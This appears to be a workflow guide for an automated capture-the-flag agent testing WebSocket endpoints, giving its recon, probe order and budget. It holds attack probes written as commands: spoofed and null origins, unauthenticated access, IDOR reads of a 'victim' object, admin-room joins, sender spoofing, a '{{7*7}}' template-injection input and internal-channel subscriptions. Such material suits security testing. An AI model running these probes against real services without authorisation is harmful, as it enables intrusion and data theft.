# Workflow — the end-to-end pass, ordered

## Step 0 — the recon (bounded, ~3-6 commands)

```bash
python3 tools/web/bundle_miner.py "$BASE" --out /tmp/bundle
grep -riE 'wss?://|new WebSocket|socket\.io|SockJS|stomp|pusher|ably|graphql-ws|mqtt' /tmp/bundle | head -10
grep -riE '"(action|type|event|cmd|id|room|channel|user_id|role|from|token|q|filter|file|subscribe|destination)"' /tmp/bundle | head -40
curl -sI "$BASE/login" | grep -i 'set-cookie'
```

Outputs: the endpoint + the library/framing + the schema + the auth +
the SameSite.

## Step 1 — the handshake cells

```bash
# the baseline + the origin + the binding + the unauth + the subproto
python3 tools/web/ws_probe.py "$WS/ws" --message '{}'
python3 tools/web/ws_probe.py "$WS/ws" --origin 'https://evil.example' --message '{}'
python3 tools/web/ws_probe.py "$WS/ws" --origin 'null' --message '{}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"me"}'
python3 tools/web/ws_probe.py "$WS/ws" --message '{"action":"me"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Sec-WebSocket-Protocol: graphql-ws' --message '{}'
```

Outputs: the origin/binding/unauth/token/subproto verdicts.

## Step 2 — the framing + the schema

```text
the client lib -> the envelope (raw/42[...]/a[...]/STOMP/{"type":}/binary)
the bundle     -> the action set + the field set
```

## Step 3 — the message cells — one field per connection

```bash
# the object-IDOR + the membership + the dispatch + the spoof + the inject
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"read","id":"victim"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"join","room":"admin"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"admin"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"from":"victim","action":"x"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"q":"{{7*7}}"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"subscribe","channel":"internal"}'
```

Outputs: the idor/membership/dispatch/spoof/inject/subscribe verdicts.

## Step 4 — the verdict + the route

```text
each oracle  -> the verbatim reply + the flag-closing class
each uniform -> the verbatim rejection + the cell closed
each weak-neg -> the re-probe named
each gap     -> the unmeasured cell
```

## Step 5 — the coverage + the record

```text
the matrix: every endpoint x check cell marked
the record: field-notes.md + the verbatim replies
the budget: within the 5/15 + 25/45 caps
```

## Step 6 — the escalate

```text
uniform-all + budget-spent -> decide.py answers escalate:
    chain_match -> reclassify -> writeup_search -> novel_plan ->
    fanout_sweep -> solver_handoff
```

## The workflow-budget

```text
the handshake: ~6 probes    -> the cheap cells first
the messages:  ~12 probes   -> the per-field cells
the boundary:  ~4 probes    -> the write-side + the resume
the total:     ~22 probes   -> within the 25-probe cap
```

## The workflow-record

```
workflow: <the pass>: <the cells>: <the verdicts>: <the flag-route>
```

The workflow is the bounded pass — the cells decide the order; the
budget decides the stop.
